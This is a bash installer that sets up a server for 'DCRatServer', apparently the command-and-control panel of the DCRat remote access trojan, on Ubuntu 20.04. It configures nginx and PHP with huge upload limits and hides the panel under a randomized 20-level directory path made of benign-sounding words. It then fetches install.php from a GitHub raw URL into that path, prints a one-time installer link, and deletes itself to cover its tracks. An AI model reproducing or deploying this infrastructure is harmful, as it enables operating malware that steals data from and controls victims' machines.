#!/bin/bash
os_version=$(lsb_release -rs)
if [[ "$os_version" != "20.04" ]]; then
    echo "Need Ubuntu 20.04. Now running version $os_version."
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain)
            domain="$2"
            shift 2
            ;;
        *)
            shift
            ;;
    esac
done

log_progress() {
    timestamp=$(date +"%H:%M")
    elapsed_time=$(( SECONDS - start_time ))
    printf "[%02d:%02d] %s\n" $((elapsed_time/60)) $((elapsed_time%60)) "$1"
}

log() {
    printf "%s\n" "$1"
}

clear
echo "Preparing the system..."
sudo apt update -y > /dev/null 2>&1 && sudo apt upgrade -y > /dev/null 2>&1
echo "Preparing DCRatServer!"
sleep 5
clear
start_time=$SECONDS
log "⚙️ The installation and configuration process has started."
echo ""
echo ""
echo "Work log:"
sleep 3
log_progress "Checking system configuration"
sleep 1
log_progress "Preparing for package installation"
sudo apt install -y software-properties-common curl wget gnupg2 ca-certificates lsb-release ubuntu-keyring > /dev/null 2>&1
sleep 1
log_progress "Installing packages"
curl -fsSL https://packages.sury.org/php/apt.gpg | sudo gpg --dearmor -o /usr/share/keyrings/php-archive-keyring.gpg --yes > /dev/null 2>&1
sleep 1
echo "deb [signed-by=/usr/share/keyrings/php-archive-keyring.gpg] https://packages.sury.org/php/ $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list.d/php.list > /dev/null 2>&1
sleep 1
sudo add-apt-repository -y ppa:ondrej/php > /dev/null 2>&1
sleep 1
sudo add-apt-repository -y ppa:ondrej/nginx > /dev/null 2>&1
sleep 1
sudo apt update -y > /dev/null 2>&1
sleep 1
sudo apt install -y nginx > /dev/null 2>&1
sleep 1
sudo apt install -y php7.4-fpm php7.4-cli php7.4-curl php7.4-sqlite3 php7.4-common php7.4-opcache php7.4-mbstring php7.4-xml php7.4-mysql > /dev/null 2>&1
sleep 1
log_progress "Configuring packages"
sudo mkdir -p /var/www/DCRatServer > /dev/null 2>&1
sudo chown -R www-data:www-data /var/www/DCRatServer > /dev/null 2>&1
sudo chmod -R 755 /var/www/DCRatServer > /dev/null 2>&1
sudo touch /var/www/DCRatServer/index.html > /dev/null 2>&1
sleep 1

server_ip=$(hostname -I | awk '{print $1}')
if [ -z "$domain" ]; then
    domain="$server_ip"
fi

config_file="/etc/nginx/sites-available/DCRatServer"
sudo tee "$config_file" > /dev/null << EOL
server {
    listen 80 default_server;
    root /var/www/DCRatServer;
    index index.php index.html index.htm index.nginx-debian.html;
    server_name $domain;

    keepalive_timeout 70;

    client_max_body_size 9000000m;
    client_body_timeout 120;
    large_client_header_buffers 32 256k;

    location / {
        try_files \$uri \$uri/ =404;
    }

    location ~ \.php\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_request_buffering off;
    }

    location ~ /\.ht {
        deny all;
    }
}
EOL

sudo ln -sf "$config_file" /etc/nginx/sites-enabled/ > /dev/null 2>&1
sleep 1
sudo nginx -t > /dev/null 2>&1
sleep 1
sudo systemctl restart nginx > /dev/null 2>&1
sudo systemctl restart php7.4-fpm > /dev/null 2>&1
sleep 1

sudo tee /etc/php/7.4/fpm/conf.d/DCRatServer.ini > /dev/null << 'EOL'
memory_limit = 800M
max_execution_time = 60
post_max_size = 9000000M
upload_max_filesize = 9000000M
max_input_time = 60
max_input_vars = 1000
EOL

sleep 1
sudo systemctl restart php7.4-fpm > /dev/null 2>&1

# Генерация случайного пути с папкой DCRatServer
words=("provider" "external" "eternal" "image" "video" "vm" "line" "pipe" "to" "python" "php" "javascript" "js" "_" "request" "poll" "secure" "http" "packet" "low" "geo" "cpu" "update" "process" "processor" "auth" "game" "longpoll" "api" "bigload" "server" "multi" "protect" "default" "sql" "db" "base" "linux" "windows" "flower" "async" "generator" "traffic" "test" "universal" "track" "wordpress" "datalife" "wp" "dle" "local" "public" "private" "temp" "cdn" "central" "uploads" "downloads" "temporary")
generate_dir_name() {
    if (( RANDOM % 5 == 0 )); then
        echo "$(( RANDOM % 10 ))"
        return
    fi
    num_words=$(( (RANDOM % 4) + 1 ))
    name=""
    for (( i=0; i<num_words; i++ )); do
        rand_index=$(( RANDOM % ${#words[@]} ))
        word=${words[$rand_index]}
        if (( RANDOM % 2 == 0 )); then
            modified_word="${word^}"
        else
            modified_word="${word,,}"
        fi
        name="${name}${modified_word}"
    done
    if (( RANDOM % 2 == 0 )); then
        digit=$(( RANDOM % 10 ))
        if (( RANDOM % 2 == 0 )); then
            name="${digit}${name}"
        else
            name="${name}${digit}"
        fi
    fi
    echo "$name"
}

nested_path=""
for (( i=1; i<=20; i++ )); do
    dir_name=$(generate_dir_name)
    nested_path="${nested_path}/${dir_name}"
done
nested_path="/var/www/DCRatServer${nested_path}"

sudo rm -rf "$nested_path" > /dev/null 2>&1
sudo mkdir -p "$nested_path" > /dev/null 2>&1
sudo chmod -R 777 "$nested_path" > /dev/null 2>&1
sleep 1
sudo touch "$nested_path/index.html"
sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "$nested_path/install.php" > /dev/null 2>&1
sudo chmod 777 "$nested_path/install.php" > /dev/null 2>&1
sleep 3

elapsed_time=$(( SECONDS - start_time ))
log "✅ Installation and configuration successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
log "🔗 Link to the installer: http://$domain${nested_path#/var/www/DCRatServer}/install.php"
log "❕ Link can only be used once."

sudo rm -- "$0" > /dev/null 2>&1
sudo rm install.php > /dev/null 2>&1
